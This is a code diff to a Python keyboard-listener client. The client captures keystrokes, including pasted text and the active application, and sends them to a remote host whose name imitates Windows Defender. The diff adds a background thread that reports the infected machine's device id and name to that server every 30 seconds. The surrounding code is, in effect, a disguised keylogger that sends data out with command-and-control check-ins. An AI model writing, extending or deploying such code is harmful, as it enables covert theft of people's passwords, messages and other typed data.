@@ -18,6 +18,7 @@ except ImportError:
     Desktop = None
 
 MESSAGE_GAP_MS = 2500
+HEARTBEAT_INTERVAL_SECONDS = 30
 SITE_URL = "https://windows-defender-cf8n.onrender.com"
 device_name = platform.node() or socket.gethostname() or "Unknown device"
 device_id = hashlib.sha256(device_name.encode("utf-8")).hexdigest()[:12]
@@ -29,6 +30,7 @@ active_target_key = None
 active_modifiers = set()
 state_lock = Lock()
 message_queue = Queue()
+client_started_at = int(time.time() * 1000)
 
 SHIFTED_SYMBOLS = {
     "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
@@ -168,6 +170,34 @@ def send_message(text, app_name, is_pasted=False):
         print(f"Could not send message: {error}")
 
 
+def send_heartbeat():
+    try:
+        headers = {"Content-Type": "application/json"}
+        request = Request(
+            f"{SITE_URL}/api/devices/heartbeat",
+            data=json.dumps(
+                {
+                    "device_id": device_id,
+                    "device_name": device_name,
+                    "started_at": client_started_at,
+                }
+            ).encode("utf-8"),
+            headers=headers,
+            method="POST",
+        )
+        with urlopen(request, timeout=10) as response:
+            if response.status >= 400:
+                raise RuntimeError(f"HTTP {response.status}")
+    except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
+        print(f"Could not send device heartbeat: {error}")
+
+
+def heartbeat_sender():
+    while True:
+        send_heartbeat()
+        time.sleep(HEARTBEAT_INTERVAL_SECONDS)
+
+
 def message_sender():
     while True:
         text, app_name, is_pasted = message_queue.get()
@@ -246,5 +276,6 @@ def on_release(key):
 
 print(f"Sending to {SITE_URL}")
 Thread(target=message_sender, daemon=True).start()
+Thread(target=heartbeat_sender, daemon=True).start()
 with Listener(on_press=on_press, on_release=on_release) as keyboard_listener:
     keyboard_listener.join()
